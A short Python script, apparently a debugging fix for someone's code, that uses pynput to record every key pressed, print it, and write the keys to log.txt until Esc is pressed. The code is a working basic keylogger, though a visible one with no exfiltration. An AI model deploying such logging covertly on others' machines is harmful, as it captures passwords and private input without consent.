import pynput
from pynput.keyboard import Key, Listener

# 1. Changed name to 'keys' to match your function logic
keys = []

def on_press(key):
    keys.append(key)
    write_file(keys)
    try:
        print('alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('special key {0} pressed'.format(key))

def write_file(keys):
    with open('log.txt', 'w') as f:
        for key in keys:
            # 2. This must be indented to be INSIDE the for loop
            k = str(key).replace("'", "")
            f.write(k + " ") # Writing the key to the file

def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc: # 'Key.esc' needs a capital K
        return False   # 'False' must be capitalized

# 3. This block must be outside of any function to run
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()